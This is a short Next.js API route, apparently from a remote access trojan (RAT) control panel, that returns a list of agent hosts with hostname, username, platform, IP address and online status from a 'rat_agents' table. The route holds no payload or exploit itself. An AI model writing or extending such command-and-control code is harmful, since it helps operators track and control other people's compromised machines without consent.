// app/api/rat/agents/route.ts

import { NextResponse } from 'next/server'
import sql from '@/lib/db'
import { getSession } from '@/lib/auth'

export async function GET() {
  const session = await getSession()
  if (!session) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 })

  const agents = await sql`
    SELECT
      id, hostname, username, platform, ip, last_seen,
      (last_seen > NOW() - INTERVAL '15 seconds') AS connected
    FROM rat_agents
    ORDER BY last_seen DESC
    LIMIT 500
  `
  return NextResponse.json(agents)
}